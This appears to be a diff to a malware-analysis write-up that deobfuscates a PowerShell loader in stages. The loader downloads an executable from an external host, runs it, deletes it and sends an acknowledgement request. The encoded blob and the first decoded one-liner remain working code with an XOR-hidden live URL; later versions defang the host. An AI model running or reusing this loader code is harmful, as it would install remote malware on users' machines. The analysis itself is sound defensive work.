@@ -49,14 +49,14 @@ $null=$z2038e.Run($z32e2a+[char]32+$z01e5d,0,$false);exit
 In the next step, I'll deobfuscate each line and variable declaration to make it easier to understand what's going on
 ```PowerShell
 # $base64encodedString='QwlSU1ECWkAjCBBATEAJCwgGAyMGEwZAXEMJVVVfVlpAMBUOEwJATEAmCwslHhMCFEBcQwBRU19UWldcQwBTBgEDWldcEA8OCwJPQwBRU19USgsTR1RXUFJVUE4cQwBTBgEDTFo8CgYTDzpdXTQWFRNPQwBRU19UTV9OXExMQwBRU19UGlxDElReVVdWWkoNCA4JTydPUUtVUUtVUUtUV0tfU0tRUktRUktVXktVU0tVXktRUEtVU0tWVktVX0tQS19LUEtWVEtWUktVUUtQS1ZLV0tWV0tWUktVUUtWVktRU0tWVUtWVktWVktVX0tRUkteVEtfXkteU0teVUtfXktWVktfXkteU0teUktfXkteV0tfXktWVEtfUEteV0tfS15US1ZSS15WS19fS15VS15US19fS15US15US1ZSS1ZSS1ZUS15WS15VS15XS19fS15VS1ZXS1ZVS1ZXS19fS19fS15US19LVlJLXldLXlVLX1FLXlRLX19LX1FLVlZLVlJLXlVLXlNLX1FLXlZLVlRLX0tfX0teVEtfUEteUktWVUteV0tfXkteVUteUk4bQhw8BA8GFTpPQzhKBR8IFVZWV04aTlxDEwNaPC4oSTcGEw86XV0kCAoFDgkCTzwuKEk3BhMPOl1dIAITMwIKFzcGEw9PTks8LihJNwYTDzpdXSACEzUGCQMICiEOCwIpBgoCT05OXDwuKEkjDhUCBBMIFR46XV0kFQIGEwIjDhUCBBMIFR5PQxMDThsoEhNKKRILC1xDEwFaPC4oSTcGEw86XV0kCAoFDgkCT0MTA0s8LihJNwYTDzpdXSACEzUGCQMICiEOCwIpBgoCT05MQEkCHwJATlxDEARaKQIQSigFDQIEE0dPQCkCQExAE0kwAgUkCw4CCRNATlxDCAxaV1wBCBVPQw5aV1xDDkdKCxNHVEdKBgkDR0ZDCAxcQw5MTE4cExUeHDwuKEkhDgsCOl1dQwlVVV9WT0MTAUtDEARJQwlSU1ECT0MSVF5VV1ZOTlwOAU88LihJIQ4LAjpdXSIfDhQTFE9DEwFOThxDCAxaVhoCCxQCHDQTBhUTSjQLAgIXR1UaGgQGEwQPHDQTBhUTSjQLAgIXR1UaGlwOAU9GPC4oSSEOCwI6XV0iHw4UExRPQxMBTk4cAh8OExpcNBMGFRNKNxUIBAIUFEdKIQ4LAjcGEw9HQxMBXBMVHhw0EwYVE0o0CwICF0dSXDwuKEkhDgsCOl1dIwILAhMCT0MTAU4aBAYTBA8cGlxDElEDUgNRWkoNCA4JTydPVlVXS1ZXV0tWV1dLXlFLU1VLUVRLUVRLXl5LVldVS15eS1FWS1ZXVUtWVlBLXl9LVlVWS1ZWX0tWVVZLVlZSS1ZWVEtWV1dLVlVWS1ZVUEtWVVFLVlZRS1ZWVEtWV1dLVlZQS1FVS1ZWU0tWVlBLVlZQS15fS1FUS1NXS1RSS1RRS1NXS1ZWVEtWVlBLVlZTS1RSS1ZWUktWVlRLVFJLVFNLU1dLVFRLVlZQS1RVS1NQS1ZWVEtWVlJLVlVUS1NSS1RUThtCHDwEDwYVOk9DOEoFHwgVVlFOGk5cQwlRUVJeWkAjCBAJCwgGAzQTFQ5ATEAJAEBcExUeHDwRCA4DOkMQBElDCVFRUl5PQxJRA1IDUU4aBAYTBA8cGlw=';
-$systemConvert=[Object].Assembly.GetType(System.Convert);
-$base64Method=$systemConvert.GetMethod(FromBase64String,[type[]]@([string]));
+$systemConvert=[Object].Assembly.GetType("System.Convert");
+$base64Method=$systemConvert.GetMethod("FromBase64String",[type[]]@([string]));
 $base64decodedString=-join($base64Method.Invoke($null,[array]$base64encodedString)|%{[char]($_ -bxor 103)});
-$systemTextEncoding=[Object].Assembly.GetType(System.Text.Encoding);
-$unicodeEncoding=$systemTextEncoding.GetProperty(Unicode).GetValue($null);
-$getBytesMethod=$systemTextEncoding.GetMethod(GetBytes,[type[]]@([string]));
+$systemTextEncoding=[Object].Assembly.GetType("System.Text.Encoding");
+$unicodeEncoding=$systemTextEncoding.GetProperty("Unicode").GetValue($null);
+$getBytesMethod=$systemTextEncoding.GetMethod("GetBytes",[type[]]@([string]));
 $b64Bytes=$getBytesMethod.Invoke($unicodeEncoding,(,$base64decodedString));
-$toBase64Method=$systemConvert.GetMethod(ToBase64String,[type[]]@([byte[]]));
+$toBase64Method=$systemConvert.GetMethod("ToBase64String",[type[]]@([byte[]]));
 $b64EncodedString=$toBase64Method.Invoke($null,(,$b64Bytes));
 $PShell=powershell;
 $powershellCommand="-NoP -NonI -W H -EncodedCommand "+$b64EncodedString;
@@ -64,5 +64,109 @@ $wscript=WScript.Shell;
 $wscriptObject=New-Object -ComObject $wscript;
 $null=$wscriptObject.Run($PShell+[char]32+$powershellCommand,0,$false);exit
 ```
-## To be continued...
+This set of commands bXORs and then decodes the value of `base64encodedString`, it then takes that value and gets the bytes, to then convert it back into base64, where it is then passed to powershell's `EncodedCommand` parameter and executed via Wscript.Shell.
+The decoded command is shown below.
+```PowerShell
+# $n546e='Dow'+'nloadData';$n2281='Write'+'AllBytes';$g6483=0;$g4afd=0;while($g6483-lt 307527){$g4afd+=[math]::Sqrt($g6483*8);++$g6483};$u39201=-join(@(6,26,26,30,84,65,65,29,24,29,67,24,11,28,7,8,7,13,15,26,7,1,0,10,15,26,11,64,12,11,11,28,65,93,89,94,92,89,11,89,94,95,89,90,89,13,87,90,8,93,15,91,88,92,93,88,93,93,15,15,13,91,92,90,88,92,10,12,10,88,88,93,8,15,90,92,86,93,88,86,11,15,92,94,86,91,13,8,88,93,87,95,12,90,89,92,95)|%{[char]($_-bxor110)});$td=[IO.Path]::Combine([IO.Path]::GetTempPath(),[IO.Path]::GetRandomFileName());[IO.Directory]::CreateDirectory($td)|Out-Null;$tf=[IO.Path]::Combine($td,[IO.Path]::GetRandomFileName()+'.exe');$wc=New-Object ('Ne'+'t.WebClient');$ok=0;for($i=0;$i -lt 3 -and !$ok;$i++){try{[IO.File]::$n2281($tf,$wc.$n546e($u39201));if([IO.File]::Exists($tf)){$ok=1}else{Start-Sleep 2}}catch{Start-Sleep 2}};if(![IO.File]::Exists($tf)){exit};Start-Process -FilePath $tf;try{Start-Sleep 5;[IO.File]::Delete($tf)}catch{};$u6d5d6=-join(@(120,100,100,96,42,63,63,99,102,99,61,102,117,98,121,118,121,115,113,100,121,127,126,116,113,100,117,62,114,117,117,98,63,40,35,36,40,113,117,114,35,115,113,35,34,40,33,117,32,47,113,115,123,45,33)|%{[char]($_-bxor16)});$n6659='DownloadStri'+'ng';try{[void]$wc.$n6659($u6d5d6)}catch{};
+```
+Cleaning this up shows
+```PowerShell
+$n546e='Dow'+'nloadData'
+$n2281='Write'+'AllBytes'
+$g6483=0
+$g4afd=0
+while($g6483-lt 307527)
+{
+  $g4afd+=[math]::Sqrt($g6483*8)
+  ++$g6483
+}
+$u39201=-join(@(6,26,26,30,84,65,65,29,24,29,67,24,11,28,7,8,7,13,15,26,7,1,0,10,15,26,11,64,12,11,11,28,65,93,89,94,92,89,11,89,94,95,89,90,89,13,87,90,8,93,15,91,88,92,93,88,93,93,15,15,13,91,92,90,88,92,10,12,10,88,88,93,8,15,90,92,86,93,88,86,11,15,92,94,86,91,13,8,88,93,87,95,12,90,89,92,95)|%{[char]($_-bxor110)})
+$td=[IO.Path]::Combine([IO.Path]::GetTempPath(),[IO.Path]::GetRandomFileName())
+[IO.Directory]::CreateDirectory($td)|Out-Null
+$tf=[IO.Path]::Combine($td,[IO.Path]::GetRandomFileName()+'.exe')
+$wc=New-Object ('Ne'+'t.WebClient')
+$ok=0
+for($i=0;$i -lt 3 -and !$ok; $i++)
+{
+  try{
+    [IO.File]::$n2281($tf,$wc.$n546e($u39201))
+    if([IO.File]::Exists($tf)){
+      $ok=1
+    }
+    else
+    {
+      Start-Sleep 2
+    }
+  }
+  catch{
+    Start-Sleep 2
+  }
+}
+if(![IO.File]::Exists($tf))
+{
+  exit
+}
+Start-Process -FilePath $tf
+try{
+  Start-Sleep 5
+  [IO.File]::Delete($tf)}catch{}
+  $u6d5d6=-join(@(120,100,100,96,42,63,63,99,102,99,61,102,117,98,121,118,121,115,113,100,121,127,126,116,113,100,117,62,114,117,117,98,63,40,35,36,40,113,117,114,35,115,113,35,34,40,33,117,32,47,113,115,123,45,33)|%{[char]($_-bxor16)})
+  $n6659='DownloadStri'+'ng'
+try{
+  [void]$wc.$n6659($u6d5d6)
+}
+catch{}
 
+```
+Further deobfuscating shows
+```PowerShell
+$downloadDataString='Dow'+'nloadData'
+$writeAllBytesString='Write'+'AllBytes'
+$timesEightVariable=0
+$sqrtValue=0
+while($timesEightVariable -lt 307527)
+{
+  $sqrtValue+=[math]::Sqrt($timesEightVariable*8)
+  ++$timesEightVariable
+}
+$downloadFile='hxxp[:]//svs-verificationdate[.]beer/37027e701747c94f3a5623633aac52462dbd663fa428368ea2085cf6391b4721' #Defanged URL
+$temporaryDirectory=[IO.Path]::Combine([IO.Path]::GetTempPath(),[IO.Path]::GetRandomFileName())
+[IO.Directory]::CreateDirectory($temporaryDirectory)|Out-Null
+$temporaryFile=[IO.Path]::Combine($temporaryDirectory,[IO.Path]::GetRandomFileName()+'.exe')
+$webClient=New-Object ('Net.WebClient')
+$ok=0
+for($i=0;$i -lt 3 -and !$ok; $i++)
+{
+  try{
+    [IO.File]::$writeAllBytesString($temporaryFile,$webClient.$downloadDataString($downloadFile))
+    if([IO.File]::Exists($temporaryFile)){
+      $ok=1
+    }
+    else
+    {
+      Start-Sleep 2
+    }
+  }
+  catch{
+    Start-Sleep 2
+  }
+}
+if(![IO.File]::Exists($temporaryFile))
+{
+  exit
+}
+Start-Process -FilePath $temporaryFile
+try{
+  Start-Sleep 5
+  [IO.File]::Delete($temporaryFile)
+}
+catch{}
+$ackURL='hxxp[:]//svs-verificationdate[.]beer/8348aeb3ca3281e0?ack=1'
+$downloadString='DownloadString'
+try{
+  [void]$webClient.$downloadString($ackURL)
+}
+catch{}
+```
+Analysing this, there seems to be a time wasting / mathematic operation loop to square root multiples of 8 and add them up.
+After this, it creates a temporary directory and .exe file and tries to download the value of `hxxp[:]//svs-verificationdate[.]beer/37027e701747c94f3a5623633aac52462dbd663fa428368ea2085cf6391b4721` to the new temp file. If it downloads, it tries starting the process. Once it does that, it sleeps for 5s, deletes the new temp file and then calls out to `hxxp[:]//svs-verificationdate[.]beer/8348aeb3ca3281e0?ack=1`
